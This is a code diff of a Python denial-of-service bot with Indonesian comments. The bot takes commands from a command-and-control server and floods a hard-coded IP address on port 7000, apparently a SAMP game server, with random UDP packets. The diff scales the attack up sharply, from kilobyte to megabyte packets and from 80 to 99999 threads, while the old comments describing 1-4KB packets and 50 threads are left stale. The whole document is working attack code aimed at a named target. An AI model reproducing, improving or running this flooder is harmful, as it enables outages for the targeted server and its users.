@@ -9,7 +9,7 @@ def attack_udp(target_ip, target_port):
     
     while True:
         # Membuat data acak berukuran besar
-        packet_size = random.randint(1024, 4096)  # Mengirimkan paket antara 1KB hingga 4KB
+        packet_size = random.randint(1000000, 4000000)  # Mengirimkan paket antara 1KB hingga 4KB
         packet = bytearray(random.getrandbits(8) for _ in range(packet_size))  # Paket acak
         sock.sendto(packet, (target_ip, target_port))
         print(f"[ATTACK] Mengirimkan {packet_size} bytes ke {target_ip}:{target_port}")
@@ -41,7 +41,7 @@ def connect_to_cc_server():
             # Dimulai dengan serangan UDP
             target_ip = "54.179.180.138"  # Ganti dengan IP server SAMP target
             target_port = 7000        # Port default SAMP
-            num_threads = 80          # Menggunakan 50 thread untuk serangan
+            num_threads = 99999          # Menggunakan 50 thread untuk serangan
             start_attack(target_ip, target_port, num_threads)
         
         elif command == "Serangan Dihentikan!":
